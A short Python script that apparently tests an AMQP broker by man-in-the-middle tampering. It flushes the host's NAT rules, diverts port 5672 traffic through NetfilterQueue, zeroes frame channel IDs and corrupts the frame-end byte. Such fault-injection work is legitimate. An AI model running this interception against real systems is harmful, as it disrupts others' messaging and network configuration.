import os
from scapy.all import *
from netfilterqueue import NetfilterQueue

def patch(pkt):
    ip = IP(pkt.get_payload())
    if ip.haslayer(Raw):
        raw = bytearray(ip[Raw].load)

        # M-1 – Channel ID → 0
        if raw[0] in (1, 2, 3):      # method / header / body
            raw[1] = raw[2] = 0

        # M-2 – Frame-end 0xCE → 0xCF
        if raw[-1] == 0xCE:
            raw[-1] = 0xCF

        ip[Raw].load = bytes(raw)
        del ip[IP].chksum, ip[TCP].chksum
        pkt.set_payload(bytes(ip))

    pkt.accept()

# regla NAT → NFQUEUE
os.system("iptables -t nat -F")
os.system("iptables -t nat -A PREROUTING -p tcp --dport 5672 -j NFQUEUE --queue-num 1")
print("[MITM] NFQUEUE lista (M-1 y M-2 activados)")

nf = NetfilterQueue()
nf.bind(1, patch)
nf.run()
